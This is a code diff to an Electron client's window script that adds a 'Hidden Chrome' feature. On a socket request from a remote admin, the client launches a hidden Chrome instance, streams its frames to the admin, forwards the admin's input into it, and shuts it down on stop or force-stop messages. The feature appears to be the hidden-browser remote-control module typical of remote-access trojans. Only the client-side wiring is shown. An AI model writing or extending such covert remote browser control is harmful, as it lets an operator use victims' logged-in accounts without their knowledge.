@@ -242,6 +242,32 @@ window.onload = async () => {
             await window.electronAPI.remoteAction(action);
         });
 
+        // Handle Hidden Chrome requests
+        let currentAdminForHiddenChrome = null;
+        socket.on('request-hidden-chrome', async (adminId) => {
+            console.log("Admin requested Hidden Chrome");
+            currentAdminForHiddenChrome = adminId;
+            const success = await window.electronAPI.startHiddenChrome();
+            if (!success) {
+                socket.emit('client-error', "Failed to start hidden Chrome. Chrome might not be installed.");
+            }
+        });
+
+        window.electronAPI.onHiddenChromeFrame((frameData) => {
+            if (currentAdminForHiddenChrome) {
+                socket.emit('hidden-chrome-frame', { adminId: currentAdminForHiddenChrome, frame: frameData });
+            }
+        });
+
+        socket.on('hidden-chrome-action', async (action) => {
+            await window.electronAPI.sendHiddenChromeAction(action);
+        });
+
+        socket.on('stop-hidden-chrome', async () => {
+            currentAdminForHiddenChrome = null;
+            await window.electronAPI.stopHiddenChrome();
+        });
+
         // Handle Force Stop from Server
         socket.on('force-stop-all', () => {
             console.log("Force Stop All received");
@@ -257,6 +283,8 @@ window.onload = async () => {
                 peerConnection.close();
                 peerConnection = null;
             }
+            window.electronAPI.stopHiddenChrome();
+            currentAdminForHiddenChrome = null;
         });
 
         // Helper function to setup WebRTC
@@ -336,6 +364,8 @@ window.onload = async () => {
                 peerConnection.close();
                 peerConnection = null;
             }
+            window.electronAPI.stopHiddenChrome();
+            currentAdminForHiddenChrome = null;
         });
     };
 
